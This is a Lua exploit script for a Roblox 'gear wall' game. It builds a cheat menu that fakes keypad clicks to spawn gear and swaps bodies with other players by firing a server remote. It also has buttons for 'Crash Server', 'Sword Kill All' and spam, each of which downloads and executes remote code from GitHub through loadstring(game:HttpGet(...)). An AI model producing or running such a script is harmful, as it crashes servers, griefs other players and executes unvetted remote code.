
  function typegear(inputValue, teleportPlayer)
      -- Default teleportPlayer to true if not provided
      teleportPlayer = teleportPlayer == nil and true or teleportPlayer
  
      -- Select a random keypad from the found keypads
      local foundKeypads = {} -- Make sure to populate this with your keypads beforehand
      for _, object in ipairs(game.Workspace:GetDescendants()) do
          if object:IsA("Model") and object.Name == "Gear Machine" then
              local keypad = object:FindFirstChild("Keypad") -- Adjust "Keypad" if needed
              if keypad then
                  table.insert(foundKeypads, keypad)
              end
          end
      end
  
      if #foundKeypads == 0 then
          warn("No keypads found.")
          return
      end
  
      local randomKeypad = foundKeypads[math.random(1, #foundKeypads)]
      local lSpawn = randomKeypad:FindFirstChild("lSpawn")
  
      -- Check if teleportPlayer is true
      if teleportPlayer and lSpawn and lSpawn:IsA("BasePart") then
          local player = game.Players.LocalPlayer
          local character = player.Character or player.CharacterAdded:Wait()
          local humanoidRootPart = character:FindFirstChild("HumanoidRootPart")
          
          if humanoidRootPart then
              -- Save the player's original position
              local originalPosition = humanoidRootPart.CFrame
  
              -- Teleport to the keypad's lSpawn
              humanoidRootPart.CFrame = lSpawn.CFrame
  
              -- Return to original position after 0.2 seconds
              task.delay(0.2, function()
                  humanoidRootPart.CFrame = originalPosition
              end)
          else
              warn("HumanoidRootPart not found.")
              return
          end
      end
  
      -- Simulate typing the input value on the random keypad
      for i = 1, #inputValue do
          local buttonName = inputValue:sub(i, i) -- Extract each character
          local button = randomKeypad:FindFirstChild(buttonName) -- Find the button by name
  
          if button then
              local clickDetector = button:FindFirstChild("RangeC") -- Adjust "RangeC" if needed
  
              if clickDetector then
                  fireclickdetector(clickDetector) -- Fire the click detector
                  print("Clicked button '" .. buttonName .. "' on keypad: " .. randomKeypad.Name)
              else
                  warn("Click detector 'RangeC' not found in button " .. buttonName)
              end
          else
              warn("Button named '" .. buttonName .. "' not found in the keypad.")
          end
      end
  
      -- Click the Enter button
      local enterButton = randomKeypad:FindFirstChild("Enter")
      if enterButton then
          local enterClickDetector = enterButton:FindFirstChild("RangeC")
          if enterClickDetector then
              fireclickdetector(enterClickDetector)
              print("Clicked 'Enter' button on keypad: " .. randomKeypad.Name)
          else
              warn("Click detector 'RangeC' not found in Enter button.")
          end
      else
          warn("'Enter' button not found in the keypad.")
      end
  
      -- Clear the keypad
      local clearButton = randomKeypad:FindFirstChild("Clear")
      if clearButton then
          local clearClickDetector = clearButton:FindFirstChild("RangeC")
          if clearClickDetector then
              wait(0.1)
              fireclickdetector(clearClickDetector)
              print("Clicked 'Clear' button on keypad: " .. randomKeypad.Name)
          else
              warn("Click detector 'RangeC' not found in Clear button.")
          end
      else
          warn("'Clear' button not found in the keypad.")
      end
  end
  local function swapWithUser(partialUsername)
      local Players = game:GetService("Players")
      local localPlayer = Players.LocalPlayer
  
      -- Find the target player by partial or case-insensitive username
      local targetPlayer = nil
      for _, player in ipairs(Players:GetPlayers()) do
          if player.Name:lower():find(partialUsername:lower()) then
              targetPlayer = player
              break
          end
      end
  
      -- Check if the target player was found
      if targetPlayer and targetPlayer.Character then
          local args = {
              [1] = targetPlayer.Character
          }
          -- Fire the swap event
          localPlayer.Character.BodySwapPotion.SwapWith:FireServer(unpack(args))
          print("Swapped with " .. targetPlayer.Name)
      else
          print("Player not found or invalid target.")
      end
  end
  
  -- Example usage:
  
  local Library = loadstring(game:HttpGet("https://raw.githubusercontent.com/shidemuri/scripts/main/ui_lib.lua"))()
  local Pendulum = Library:New("test all gears fucker")
  
  local gearwall = Pendulum:NewTab("gear spawning")
  local gearwall2 = Pendulum:NewTab("model stuff")
  local gearwall3 = Pendulum:NewTab("universal stuff")
  local gearwall4 = Pendulum:NewTab("game breaking shit")
  local gearwall5 = Pendulum:NewTab("spam scripts")
  local gearwall6 = Pendulum:NewTab("walkspeed/other stuff")
  -- gear spawning
  gearwall6:NewButton("get body swap gear", "mreow", function()
  typegear("78730532")
  wait(0.2)
  end)
  local customid2 = gearwall6:NewTextBar("username", ":D")
  gearwall6:NewButton("body swap (equip body swap gear)", "mreow", function()
  
  swapWithUser(customid2.Text)
  end)
    local walkspeed = gearwall6:NewTextBar("walkspeed number", ":D")
  gearwall6:NewButton("set walkspeed", "mreow", function()
  game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = walkspeed.Text
  end)
  gearwall:NewButton("Delete All Ur Tools", ":3", function()
  game.Players.LocalPlayer.Backpack:ClearAllChildren()
  end)
  local customid = gearwall:NewTextBar("gear id", ":D")
  gearwall:NewButton("spawn gear", "mreow", function()
  typegear(customid.Text)
  end)
  gearwall:NewButton("Icedagger", ":3", function()
  typegear("83704165")
  end)
gearwall:NewButton("Hedgehog Cannon", ":3", function()
  typegear("60357972")
  end)
   gearwall:NewButton("Scroll ", ":3", function()
  typegear("125013830")
  end)
  gearwall:NewButton("Green Sword", ":3", function()
  typegear("80661504")
  end)
  -- model spawning 
  gearwall2:NewButton("Easter Zombie", ":3", function()
  typegear("24673922", false)
  end)
  -- universal
  gearwall3:NewButton("inf yeild", ":3", function()
  loadstring(game:HttpGet("https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source"))()
  end)
       
  gearwall3:NewButton("rejoin game", ":3", function()
  local teleportService = game:GetService("TeleportService")
  local placeId = game.PlaceId -- Current game's Place ID
  local jobId = game.JobId -- Current server's Job ID
  
  teleportService:TeleportToPlaceInstance(placeId, jobId, game.Players.LocalPlayer)
          
  end)
  -- game breaking shit
  gearwall4:NewButton("Crash Server", ":3", function()
  loadstring(game:HttpGet("https://raw.githubusercontent.com/n0raxd/the-sweat-list/refs/heads/main/server%20crash"))()
  end)
  gearwall4:NewButton("Sword Kill All (Requires Ice Dagger)", ":3", function()
  loadstring(game:HttpGet('https://raw.githubusercontent.com/zephyr10101/sword-kill-all/main/script'))()
  end)
  -- spamming to be done
  gearwall5:NewButton("pony spam", ":3", function()
  
  loadstring(game:HttpGet('https://raw.githubusercontent.com/n0raxd/gear-wall-fucker/refs/heads/main/pony'))()
  end)

  print("not gear wall, not loading")

